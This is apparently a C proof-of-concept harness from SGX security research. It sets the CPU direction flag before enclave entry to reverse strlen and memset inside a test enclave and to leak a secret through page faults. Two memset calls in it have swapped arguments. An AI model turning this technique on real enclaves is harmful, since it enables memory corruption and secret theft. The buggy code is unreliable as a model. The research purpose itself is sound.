#include <stdio.h>
#include <sgx_urts.h>
#include <sgx_error.h>
#include <signal.h>
#include <sys/mman.h>
#include "Enclave/inc_u.h"

sgx_status_t sgx_rv;
char __attribute__((aligned(0x1000))) my_page[0x1000];

#define ENCLAVE_PATH                "./Enclave/inc.so"
#define ENCLAVE_DBG                 1
#define ENCLU_OPCODE                0x0f01d7

#define SGX_ASSERT(f)  { if ( SGX_SUCCESS != (sgx_rv = (f)) )           \
 {                                                                      \
       printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__,  \
                                              __LINE__, sgx_rv);        \
       abort();                                                         \
 } }

#define ASSERT(cond)                                                    \
    do {                                                                \
        if (!(cond))                                                    \
        {                                                               \
            perror("[" __FILE__ "] assertion '" #cond "' failed");      \
            abort();                                                    \
        }                                                               \
    } while(0)

void page_fault_handler(int signo, siginfo_t * si, void  *ctx)
{
    void *base_adrs;
    uint64_t rip, flags;
    char *rip_arr;
    uint64_t rip_opcode;
    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        base_adrs = si->si_addr;
        printf("Caught page fault (base address=%p)\n", base_adrs);

        rip = uc->uc_mcontext.gregs[REG_RIP];
        rip_arr = (char*) rip;
        rip_opcode = ((rip_arr[0] & 0xff) << 16) | ((rip_arr[1] & 0xff) << 8) | (rip_arr[2] & 0xff);
        flags = uc->uc_mcontext.gregs[REG_EFL];

        printf("\tRIP=%p (opcode=%p; ENCLU=%p; AEP=%d)\n",
            rip, rip_opcode, ENCLU_OPCODE, rip_opcode == ENCLU_OPCODE);
        printf("\tRFLAGS=%p (DF=%d)\n", flags, (flags & 0x400) != 0);

        printf("--> FAIL (corrupted enclave heap)\n");
        puts("\nexiting..");
        exit(0);
        break;
    
      default:
        printf("Caught unknown signal '%d'\n", signo);
        abort();
    }
}

int main( int argc, char **argv )
{
	sgx_enclave_id_t eid = 0;
	sgx_status_t ret = SGX_SUCCESS;
    struct sigaction act, old_act;
    int len  = 0;
    char buf[100];

    puts("Registering fault handler...");
    memset(&act, sizeof(sigaction), 0);
    memset(my_page, 0x1000, 'A');

    /* Specify handler with signinfo arguments */
    act.sa_sigaction = page_fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;
    
    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT (!sigaction( SIGSEGV, &act, &old_act ));

    puts("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( ENCLAVE_PATH, ENCLAVE_DBG,
                                    NULL, NULL, &eid, NULL ) );
    puts("--> OK");

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF strlen direction hijack");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w DF=%d\n", i % 2);
        /* STD not sufficiently close here, will be overriden in the URTS
         * runtime; needs to be done right before ENCLU */
        len = 0;
        sgx_do_std( i % 2);
        SGX_ASSERT( ecall_strlen(eid, &len) );
        printf("enclave strlen=%d\n", len);
    }
    sgx_do_std(0);

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF memset direction hijack");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w DF=%d\n", i % 2);
        memset(buf, 'X', 100);
        sgx_do_std( i % 2);
        SGX_ASSERT( ecall_memset(eid, buf) );

        printf("enclave memset=");
        for (int j=0; j < 100; j++)
            printf("%c", buf[j]);
        printf("\n");
    }
    sgx_do_std(0);

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF side-channel leakge");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w secret=%d\n", i % 2);
        ASSERT( !mprotect(my_page, 0x1000, PROT_NONE) );
        SGX_ASSERT( ecall_leak_df(eid, i % 2, my_page) );
    }

    printf("\n--------------------------------------------------\n");
    puts("RFLAGS.DF edger8r memset direction hijack");
    printf("--------------------------------------------------\n");
    for (int i=0; i<4; i++)
    {
        printf("\nRunning victim w DF=%d\n", i % 2);
        memset(buf, 'X', 100);
        sgx_do_std( i % 2);
        SGX_ASSERT( ecall_edger8r(eid, buf) );

        printf("--> OK\n");
        printf("enclave memset=");
        for (int j=0; j < 100; j++)
            printf("%x", buf[j]);
        printf("\n");
    }
    sgx_do_std(0);

    puts("\nall is well; exiting..");
    return 0;
}
